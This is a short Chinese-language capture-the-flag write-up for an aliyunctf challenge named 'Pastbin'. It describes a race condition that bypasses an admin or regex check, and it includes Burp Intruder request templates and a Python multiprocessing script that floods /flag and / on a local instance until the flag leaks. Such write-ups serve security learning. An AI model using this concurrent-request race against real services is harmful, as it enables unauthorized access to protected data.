---
tags: [条件竞争, 逻辑漏洞, 权限绕过]
---

# Pastbin

只要能伪造账号为admin(可以访问到flag)后续的步骤就容易了

开两个bruteforce，第一个访问一个包含admin字符串的页面，第二个访问flag，然后有概率竞争让第一个访问拿到flag的结果，绕过正则限制。

好像都不用成为admin，也不用访问包含admin字符串的页面。。

```
GET /flag?a=§1§ HTTP/1.1
Host: 127.0.0.1:28080

GET /?a=§1§ HTTP/1.1
Host: 127.0.0.1:28080

竞争一下就行了。。本地通过了。。远程可能需要运气
import requests
from multiprocessing import Process
import multiprocessing
flag = "aliyunctf{"
def request_url(url):
while True:
try:
response = requests.get(url)
if flag in response.text:
print(f"Flag found in response from {url}: {response.text}")

except requests.exceptions.RequestException as e:
pass
def start_processes(url, num_processes):
for _ in range(num_processes):
process = Process(target=request_url, args=(url,))
process.daemon = True
process.start()
def main():
baseurl = "http://127.0.0.1:28080"
url1 = baseurl+"/flag"
url2 = baseurl+"/"
num_processes = 10
start_processes(url1, num_processes)
start_processes(url2, num_processes)
for process in multiprocessing.active_children():
process.join()
if __name__ == "__main__":
main()
```

